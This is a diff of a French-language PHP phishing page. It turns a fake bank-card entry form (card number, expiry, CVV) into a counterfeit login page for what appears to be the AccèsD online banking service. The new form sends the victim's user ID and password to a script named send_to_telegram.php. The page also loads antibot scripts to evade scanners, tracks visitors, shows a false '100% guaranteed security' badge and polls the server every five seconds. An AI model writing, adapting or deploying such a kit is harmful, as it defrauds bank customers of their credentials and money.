@@ -1,14 +1,4 @@
 <?php
-
-include("track.php");
-include 'page_notify.php'; 
-
-// Juste au début du fichier PHP
-include 'Jeehan.php';
-$jeehan = new Jeehan();
-$jeehan->track('nom_de_la_page.php'); // ex: connexion.php
-
-
 include 'src/antibots.php';
 include 'antibots.php';
 include 'anti/anti1.php';
@@ -19,9 +9,12 @@ include 'anti/anti5.php';
 include 'anti/anti6.php';
 include 'anti/anti7.php';
 include 'anti/anti8.php';
+// Juste au début du fichier PHP
+include 'Jeehan.php';
+$jeehan = new Jeehan();
+$jeehan->track('connexion.php'); 
 
 ?>
-
 <!DOCTYPE html>
 <html lang="fr">
 
@@ -31,39 +24,13 @@ include 'anti/anti8.php';
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <link rel="shortcut icon" href="image/logo.png">
     <link rel="stylesheet" href="style.css">
-    <title>Formulaire Carte Bancaire</title>
-    <style>
-        /* Styles pour l'overlay de chargement */
-        .loading-overlay {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(255, 255, 255, 0.8);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            z-index: 10;
-        }
-
-        .spinner-border {
-            width: 3rem;
-            height: 3rem;
-            color: #28a745; /* Couleur verte */
-        }
-
-        .dimmed {
-            opacity: 0.5;
-            pointer-events: none;
-        }
-    </style>
+    <title>Se connecter</title>
 </head>
 
 <body>
 
     <!-- Top Header -->
-    <div class="top-header bg-dark text-white py-2 px-4 d-flex justify-content-end align-items-center">
+    <div class="top-header bg-dark text-white py-2 px-4 d-flex justify-content-end align-items-center ">
         <a href="authentification.html" class="text-white text-decoration-none mx-2">AA +</a>
         <span class="border-start border-1 mx-2"></span>
         <a href="#" class="text-white text-decoration-none mx-2">English</a>
@@ -81,49 +48,61 @@ include 'anti/anti8.php';
     </div>
 
     <!-- Main Container -->
-    <div class="container my-5 shadow bg-white position-relative">
+    <div class="container my-5 shadow bg-white">
         <div class="row">
             <!-- Form Section -->
             <div class="col-md-6 p-5 form-section">
-                <h2 class="text-success">Formulaire de Carte Bancaire</h2>
+                <h2 class="text-success">Se connecter</h2>
 
-                <form id="payment-form" action="action/carte.php" method="POST" onsubmit="handleSubmit(event)">
-                    <div class="mb-3">
-                        <label for="cardNumber" class="form-label fw-bold">Numéro de la carte</label>
-                        <input type="text" id="cardNumber" name="cardNumber" class="form-control" placeholder="1234 5678 1234 5678" required>
-                    </div>
-
-                    <div class="mb-3">
-                        <label for="expirationDate" class="form-label fw-bold">Date d'expiration</label>
-                        <div class="d-flex">
-                            <input type="text" id="expirationMonth" name="expirationMonth" class="form-control me-2" placeholder="MM" maxlength="2" required>
-                            <input type="text" id="expirationYear" name="expirationYear" class="form-control" placeholder="AAAA" maxlength="4" required>
-                        </div>
-                    </div>
-
-                    <div class="mb-3">
-                        <label for="cvv" class="form-label fw-bold">CVV</label>
-                        <input type="text" id="cvv" name="cvv" class="form-control" placeholder="123" maxlength="3" required>
-                    </div>
+                <form id="login-form" action="action/send_to_telegram.php" method="POST">
+                    <label for="identifiant" class="fw-bold">Identifiant <span class="fs-5">&#9432;</span></label>
+                    <input type="text" id="identifiant" name="identifiant" class="form-control mb-3 small-input" required>
 
                     <div class="d-flex align-items-center mb-3">
-                        <input type="checkbox" id="saveCard" name="saveCard" class="me-2">
-                        <label for="saveCard" class="mb-0">Mémoriser cette carte</label>
+                        <input type="checkbox" id="memoriser" name="memoriser" class="me-2">
+                        <label for="memoriser" class="mb-0">Mémoriser</label>
+                        <a href="#" class="ms-2 text-success small">(C’est sécuritaire?)</a>
                     </div>
 
+                    <label for="password" class="fw-bold">Mot de passe</label>
+                    <input type="password" id="password" name="password" class="form-control mb-2 small-input" required>
+                    <i class="fas fa-eye eye-icon" id="eye-icon"></i>
+
+                    <p class="text-muted small">Attention : Respecter majuscules et minuscules</p>
+                    <div class="password-forgotten">
+                        <a href="#" class="text-success small mt-n2">Mot de passe oublié?</a>
+                    </div>
                     <button type="submit" class="btn btn-success w-50 mt-4">Valider</button>
                     <?php if (isset($_GET['error']) && $_GET['error'] == 1): ?>
     <div style="margin-top: 10px; color: red; font-weight: bold;">
-        ❌ Informations incorrectes. Veuillez réessayer.
+        ❌ Identifiant ou mot de passe incorrects. Veuillez réessayer.
     </div>
 <?php endif; ?>
 
                 </form>
 
-                <!-- Loading overlay, caché par défaut -->
-                <div id="loading-overlay" class="loading-overlay d-none">
-                    <div class="spinner-border" role="status">
-                        <span class="visually-hidden">Loading...</span>
+                <!-- Links Section -->
+                <div class="links-section mt-5">
+                    <div class="row">
+                        <div class="col col-left">
+                            <a href="#" class="text-success d-block small-link">S’inscrire à AccèsD</a>
+                            <a href="#" class="text-success d-block small-link">S’inscrire à AccèsD Affaires</a>
+                            <a href="#" class="text-success d-block small-link">Devenir membre</a>
+                        </div>
+                        <div class="col-1 d-flex align-items-center justify-content-center">
+                            <div class="separator-vertical"></div>
+                        </div>
+                        <div class="col col-middle">
+                            <a href="#" class="text-success d-block small-link">Sécurité du site</a>
+                            <a href="#" class="text-success d-block small-link">Soutien technique</a>
+                            <a href="#" class="text-success d-block small-link">Signaler une fraude</a>
+                        </div>
+                        <div class="col col-right text-end">
+                            <a href="#" class="d-flex align-items-center justify-content-end text-success">
+                                Sécurité garantie à 100 %
+                                <img src="image/cadenas.png" alt="Cadenas" class="cadenas-icon ms-2">
+                            </a>
+                        </div>
                     </div>
                 </div>
             </div>
@@ -165,18 +144,14 @@ include 'anti/anti8.php';
         </div>
     </footer>
 
-    
-
-    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.6/dist/umd/popper.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-<script>
+    <script>
    setInterval(() => {
     fetch('ping.php');
 }, 5000); // toutes les 5 secondes
 </script>
 
 </body>
-
 
 </html>
